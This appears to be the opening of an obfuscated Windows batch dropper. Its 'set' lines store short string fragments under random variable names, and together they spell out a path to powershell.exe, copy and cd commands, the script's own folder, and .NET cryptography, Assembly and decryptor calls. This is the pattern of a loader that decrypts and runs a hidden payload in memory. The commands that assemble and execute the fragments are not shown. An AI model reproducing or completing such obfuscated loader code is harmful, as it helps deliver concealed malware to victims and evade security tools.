@echo off
set "wHQKuEvKyl=0\"
set "viUqkLtfoE=xe"
set "JBJpIkZCGA=1."
set "xWaVvqaMfQ=ow"
set "rYEBBOnsTn=\v"
set "ZzlajTrmLT=do"
set "RCqZcdoWRx=we"
set "NbaNJAeRNG= /"
set "QkGnGTKmVn=y "
set "dYmAbyWBzm=ll"
set "onNSxBoWRR=we"
set "DHCOsBGHgh=he"
set "gjHShAXtzn=:\"
set "bmABqGVwZe=ws"
set "qySHMqVPHI=.e"
set "xxTDUcQtal=Po"
set "zLDwPfwpDT=st"
set "yuUZPKiTgW=rs"
set "MtscFYfYwX= C"
set "sDTHDTNmWe=he"
set "bwlYjhFDgE=Wi"
set "DzXbrUUWtL=\W"
set "TSQZrzeBSP=in"
set "hYpcmjTYnT=ll"
set "VGtrKWejOb=32"
set "gTxqYrunpN=em"
set "KQOxsEcbnD=po"
set "sBRRhtMAOe=Sy"
set "wtoubDUwSC=co"
set "CIkAKGsoJK=rS"
set "zIEmrDRSwT=py"
set "FysjRpitTy=s\"
set "PNwhddamPd=nd"
set "ePjNLFAtVw= %~dp0"
set "CHcpSMaoPf=cd"
set "azDspleKxA=)) {"
set "xjdKFPutbE=::('"
set "TynwVMSotc=.Ass"
set "sPnRVgUTnR=TnZQ"
set "ghVpZBHAAg=ypto"
set "hyKmUAYuxp=ing("
set "AhSvLtoLhl=join"
set "NapMZTOrRr=ptog"
set "WIJmlyYdFl=New-"
set "ruCQDNmtbd=raph"
set "ARxTMxMjPi=;$iV"
set "xZQVwLnkYK=rbxo"
set "GrDDIwpGYt=y.Pa"
set "NyRZcuJhHh=DNJS"
set "zzqiuRTkIA=nQ);"
set "XPDYQdMGKA=[Sys"
set "EkFhsApSyI=m.IO"
set "mlZdIjdwvT=and "
set "mxGjjebIDR=dV1k"
set "SXpkweKkcr=tryP"
set "MPRwTNjQxj=m(, "
set "dWkcPRwFTQ=hy.A"
set "pLxSxxLhcM=nQ ="
set "KVWKSXfCNE=FunQ"
set "ojGmbpmqId= '')"
set "JZGZEhfLeV=[-1."
set "FvqASJtZrQ=Q = "
set "ATTRyJDaTW=rofi"
set "XOsOvbzZHa=am;$"
set "amZnhsQnrT=.Com"
set "HNBXKupfVj=D = "
set "sWXTvbHDtF=]::N"
set "WCVSzTKeLs=-joi"
set "TYzvrQuOiF=] -j"
set "RoLsatsGcI=[Sys"
set "JaldsRWyxA=stem"
set "sySkUvEMIT=ewLi"
set "laSMaaIHWD=k.Su"
set "cgvtkfqecE=saBm"
set "JgbTZCxTHq=ptor"
